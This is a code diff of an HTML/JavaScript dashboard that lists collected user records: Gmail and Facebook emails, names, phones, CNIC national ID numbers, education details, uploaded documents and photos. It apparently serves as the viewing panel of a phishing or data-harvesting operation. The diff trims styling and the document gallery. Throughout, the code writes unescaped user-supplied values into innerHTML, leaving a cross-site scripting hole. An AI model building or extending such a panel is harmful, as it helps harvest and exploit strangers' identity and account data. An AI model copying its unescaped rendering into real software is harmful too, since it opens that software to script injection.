@@ -31,32 +31,16 @@
         .tag-gmail { background: #fce8e6; color: #ea4335; }
         .tag-fb { background: #e8f0fe; color: #1877f2; }
         .tag-profile { background: #d1fae5; color: #059669; }
-        .tag-doc { background: #fef3c7; color: #d97706; }
-        .tag-img { background: #dbeafe; color: #2563eb; }
         .user-card .data-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 8px 30px; }
         .user-card .data-grid .field { font-size: 14px; padding: 4px 0; border-bottom: 1px solid #f8fafc; }
         .user-card .data-grid .field strong { color: #0a1628; font-weight: 600; }
         .user-card .data-grid .field .value { color: #475569; }
-        .user-card .section-title { font-weight: 600; color: #0a1628; margin-top: 10px; margin-bottom: 4px; font-size: 14px; }
-        .user-card .section-title i { color: #2563eb; margin-right: 6px; }
-        .user-card .about-text { background: #f8fafc; padding: 10px 14px; border-radius: 8px; color: #475569; font-size: 14px; margin-top: 6px; border-left: 3px solid #2563eb; }
-        .user-card .image-preview { width: 80px; height: 80px; border-radius: 10px; object-fit: cover; border: 2px solid #eef2f6; margin-top: 6px; cursor: pointer; }
-        .user-card .image-preview:hover { border-color: #2563eb; transform: scale(1.05); }
-        .doc-gallery { display: flex; flex-wrap: wrap; gap: 12px; margin-top: 8px; }
-        .doc-gallery .doc-item { background: #f8fafc; border-radius: 10px; padding: 8px; text-align: center; border: 1px solid #eef2f6; width: 120px; transition: all 0.3s ease; }
-        .doc-gallery .doc-item:hover { border-color: #2563eb; transform: scale(1.03); }
-        .doc-gallery .doc-item img { width: 100px; height: 80px; object-fit: cover; border-radius: 6px; border: 1px solid #e2e8f0; cursor: pointer; }
-        .doc-gallery .doc-item img:hover { border-color: #2563eb; }
-        .doc-gallery .doc-item .doc-name { font-size: 10px; color: #64748b; margin-top: 4px; display: block; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 100px; }
-        .doc-gallery .doc-item .doc-icon { font-size: 36px; color: #94a3b8; display: block; padding: 10px; }
-        .doc-gallery .doc-item .doc-size { font-size: 9px; color: #94a3b8; }
         .total-text { font-size: 16px; color: #0a1628; margin-bottom: 20px; font-weight: 600; }
         .no-data { text-align: center; padding: 60px; color: #94a3b8; background: #fff; border-radius: 16px; border: 1px solid #eef2f6; }
         .no-data i { font-size: 48px; color: #e2e8f0; margin-bottom: 16px; }
         .toast { position: fixed; bottom: 30px; right: 30px; background: #22c55e; color: #fff; padding: 16px 24px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.15); font-weight: 600; display: none; z-index: 999; }
         .toast.error { background: #ef4444; }
-        .error-msg { background: #fef2f2; color: #dc2626; padding: 12px 16px; border-radius: 8px; margin-bottom: 16px; border-left: 4px solid #dc2626; display: none; }
-        @media (max-width: 768px) { .stats { grid-template-columns: 1fr 1fr; } .header { flex-direction: column; text-align: center; } .doc-gallery .doc-item { width: 100px; } .doc-gallery .doc-item img { width: 80px; height: 60px; } }
+        @media (max-width: 768px) { .stats { grid-template-columns: 1fr 1fr; } .header { flex-direction: column; text-align: center; } }
     </style>
 </head>
 <body>
@@ -68,8 +52,6 @@
                 <button class="clear-btn" onclick="clearAllData()"><i class="fas fa-trash"></i> Clear All Data</button>
             </div>
         </div>
-
-        <div id="errorMsg" class="error-msg"></div>
         
         <div class="stats" id="statsContainer">
             <div class="stat-card"><div class="icon"><i class="fas fa-users"></i></div><div class="number" id="totalUsers">0</div><div class="label">Total Users</div></div>
@@ -84,10 +66,10 @@
     <div id="toast" class="toast"></div>
 
     <script>
+        // ============================================================
+        //  LOAD USERS FROM API
+        // ============================================================
         async function loadUsers() {
-            const errorDiv = document.getElementById('errorMsg');
-            errorDiv.style.display = 'none';
-            
             try {
                 console.log('📤 Fetching users from /api/users...');
                 const response = await fetch('/api/users');
@@ -100,7 +82,7 @@
                 console.log('📊 Users received:', users);
                 console.log('📊 Users count:', users.length);
 
-                // Update stats
+                // ===== UPDATE STATS =====
                 document.getElementById('totalUsers').textContent = users.length;
                 document.getElementById('gmailUsers').textContent = users.filter(u => u.email).length;
                 document.getElementById('fbUsers').textContent = users.filter(u => u.fbEmail).length;
@@ -115,6 +97,7 @@
 
                 let html = '<div class="total-text"><i class="fas fa-list"></i>Total ' + users.length + ' users registered</div>';
 
+                // ===== DISPLAY USERS (Latest First) =====
                 users.slice().reverse().forEach((user, index) => {
                     const userNum = users.length - index;
                     const hasDocs = user.documents && user.documents.length > 0;
@@ -124,15 +107,16 @@
                     html += '<div class="card-header"><span class="user-id"><i class="fas fa-user-circle"></i>User #' + userNum + '</span>';
                     html += '<span class="timestamp"><i class="far fa-calendar-alt"></i> ' + (user.submittedAt || user.submitted_at || 'N/A') + '</span></div>';
                     
+                    // ===== BADGES =====
                     html += '<div class="badges">';
                     if (user.email) html += '<span class="tag tag-gmail"><i class="fas fa-envelope"></i> Gmail</span>';
                     if (user.fbEmail) html += '<span class="tag tag-fb"><i class="fab fa-facebook"></i> Facebook</span>';
                     if (user.profileCompleted) html += '<span class="tag tag-profile"><i class="fas fa-check-circle"></i> Profile Complete</span>';
-                    if (hasDocs) html += '<span class="tag tag-doc"><i class="fas fa-file"></i> ' + user.documents.length + ' Docs</span>';
-                    if (hasImage) html += '<span class="tag tag-img"><i class="fas fa-image"></i> Photo</span>';
                     html += '</div>';
                     
+                    // ===== DATA GRID =====
                     html += '<div class="data-grid">';
+                    
                     // Gmail Data
                     if (user.name) html += '<div class="field"><strong>👤 Full Name:</strong> <span class="value">' + user.name + '</span></div>';
                     if (user.email) html += '<div class="field"><strong>📧 Gmail:</strong> <span class="value" style="color:#ea4335;font-weight:600;">' + user.email + '</span></div>';
@@ -152,7 +136,6 @@
                     if (user.phone) html += '<div class="field"><strong>📱 Phone:</strong> <span class="value">' + user.phone + '</span></div>';
                     if (user.city) html += '<div class="field"><strong>🏙️ City:</strong> <span class="value">' + user.city + '</span></div>';
                     if (user.cnic) html += '<div class="field"><strong>🆔 CNIC:</strong> <span class="value">' + user.cnic + '</span></div>';
-                    if (user.cnicType) html += '<div class="field"><strong>📋 CNIC Type:</strong> <span class="value">' + user.cnicType + '</span></div>';
                     if (user.educationLevel) html += '<div class="field"><strong>📚 Education Level:</strong> <span class="value">' + user.educationLevel + '</span></div>';
                     if (user.fieldOfStudy) html += '<div class="field"><strong>📖 Field of Study:</strong> <span class="value">' + user.fieldOfStudy + '</span></div>';
                     if (user.university) html += '<div class="field"><strong>🎓 University:</strong> <span class="value">' + user.university + '</span></div>';
@@ -161,41 +144,25 @@
                     if (user.skills) html += '<div class="field"><strong>🔧 Skills:</strong> <span class="value">' + user.skills + '</span></div>';
                     html += '</div>';
                     
+                    // About
                     if (user.about) {
-                        html += '<div class="section-title"><i class="fas fa-quote-left"></i>About</div>';
-                        html += '<div class="about-text">' + user.about + '</div>';
+                        html += '<div style="margin-top:10px;background:#f8fafc;padding:10px 14px;border-radius:8px;color:#475569;font-size:14px;border-left:3px solid #2563eb;"><strong>📝 About:</strong> ' + user.about + '</div>';
                     }
                     
                     // Documents
                     if (hasDocs) {
-                        html += '<div class="section-title"><i class="fas fa-file-upload"></i>Documents Uploaded (' + user.documents.length + ')</div>';
-                        html += '<div class="doc-gallery">';
+                        html += '<div style="margin-top:8px;"><strong>📄 Documents Uploaded (' + user.documents.length + '):</strong> ';
                         user.documents.forEach(doc => {
-                            const isImage = doc.data && doc.data.startsWith('data:image/');
-                            const ext = doc.name ? doc.name.split('.').pop().toLowerCase() : '';
-                            const isImageExt = ['jpg', 'jpeg', 'png', 'gif', 'webp', 'bmp', 'svg'].includes(ext);
-                            
-                            if (isImage || isImageExt) {
-                                html += '<div class="doc-item">';
-                                html += '<img src="' + (doc.data || '') + '" alt="' + (doc.name || 'Document') + '" title="' + (doc.name || 'Document') + '" onclick="window.open(this.src)" />';
-                                html += '<span class="doc-name">' + (doc.name || 'Image') + '</span>';
-                                html += '<span class="doc-size">' + (doc.size ? (doc.size / 1024).toFixed(1) + ' KB' : '') + '</span>';
-                                html += '</div>';
-                            } else {
-                                html += '<div class="doc-item">';
-                                html += '<div class="doc-icon"><i class="fas fa-file-pdf"></i></div>';
-                                html += '<span class="doc-name">' + (doc.name || 'File') + '</span>';
-                                html += '<span class="doc-size">' + (doc.size ? (doc.size / 1024).toFixed(1) + ' KB' : '') + '</span>';
-                                html += '</div>';
-                            }
+                            html += '<span style="background:#f0f4f8;padding:2px 10px;border-radius:50px;font-size:12px;display:inline-block;margin:2px;">' + (doc.name || doc) + '</span>';
                         });
                         html += '</div>';
                     }
                     
                     // Profile Image
                     if (hasImage) {
-                        html += '<div class="section-title"><i class="fas fa-image"></i>Profile Image</div>';
-                        html += '<img src="' + user.profileImage + '" class="image-preview" onclick="window.open(this.src)" />';
+                        html += '<div style="margin-top:8px;"><strong>🖼️ Profile Image:</strong><br />';
+                        html += '<img src="' + user.profileImage + '" style="width:80px;height:80px;border-radius:10px;object-fit:cover;border:2px solid #eef2f6;margin-top:4px;cursor:pointer;" onclick="window.open(this.src)" />';
+                        html += '</div>';
                     }
                     
                     html += '</div>';
@@ -204,17 +171,24 @@
                 container.innerHTML = html;
             } catch (error) {
                 console.error('❌ Error loading users:', error);
-                errorDiv.textContent = '❌ Error loading data: ' + error.message;
-                errorDiv.style.display = 'block';
-                document.getElementById('usersList').innerHTML = '<div class="no-data"><i class="fas fa-exclamation-triangle"></i><br />Error loading data. Please try again.</div>';
+                document.getElementById('usersList').innerHTML = '<div class="no-data"><i class="fas fa-exclamation-triangle"></i><br />Error loading data: ' + error.message + '</div>';
             }
         }
 
+        // ============================================================
+        //  CLEAR ALL DATA
+        // ============================================================
         async function clearAllData() {
-            if (!confirm('⚠️ Are you sure you want to DELETE ALL data? This cannot be undone!')) return;
+            if (!confirm('⚠️ Are you sure you want to DELETE ALL data? This cannot be undone!')) {
+                return;
+            }
+
             try {
-                const response = await fetch('/api/clear-data', { method: 'DELETE' });
+                const response = await fetch('/api/clear-data', {
+                    method: 'DELETE'
+                });
                 const result = await response.json();
+
                 if (result.success) {
                     showToast('✅ All data cleared successfully!', 'success');
                     loadUsers();
@@ -222,19 +196,27 @@
                     showToast('❌ Error: ' + result.error, 'error');
                 }
             } catch (error) {
+                console.error('❌ Error clearing data:', error);
                 showToast('❌ Error clearing data', 'error');
             }
         }
 
+        // ============================================================
+        //  TOAST NOTIFICATION
+        // ============================================================
         function showToast(message, type = 'success') {
             const toast = document.getElementById('toast');
             toast.textContent = message;
             toast.className = 'toast' + (type === 'error' ? ' error' : '');
             toast.style.display = 'block';
-            setTimeout(() => { toast.style.display = 'none'; }, 3000);
+            setTimeout(() => {
+                toast.style.display = 'none';
+            }, 3000);
         }
 
-        // Load on page load
+        // ============================================================
+        //  LOAD ON PAGE LOAD
+        // ============================================================
         loadUsers();
     </script>
 </body>
